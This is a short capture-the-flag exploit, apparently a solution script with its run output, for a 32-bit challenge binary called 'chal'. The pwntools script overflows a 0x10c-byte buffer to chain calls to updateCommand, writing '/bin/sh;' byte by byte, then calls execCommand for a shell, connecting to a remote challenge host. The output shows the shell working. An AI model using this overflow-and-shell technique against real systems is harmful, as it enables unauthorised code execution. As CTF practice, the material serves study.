```python
from pwn import *

vuln = ELF("./chal")

# p = process("./chal")
p = remote("35.95.31.64", 3000)

for i, c in enumerate(b"/bin/sh;"):
    payload = b"A" * 0x10c
    payload += p32(vuln.symbols["updateCommand"])
    payload += p32(vuln.symbols["vuln"])
    payload += p32(i)
    payload += p32(c)

    p.sendlineafter(b"...", payload)

payload = b"A" * 0x10c
payload += p32(vuln.symbols["execCommand"])
p.sendlineafter(b"...", payload)

p.interactive()
```

```
$ python3 win.py
[*] '/home/donas/Documentos/hackdef/pwn/archivos/chal'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './chal': pid 54437
[*] Switching to interactive mode

$ echo pwned
pwned
```
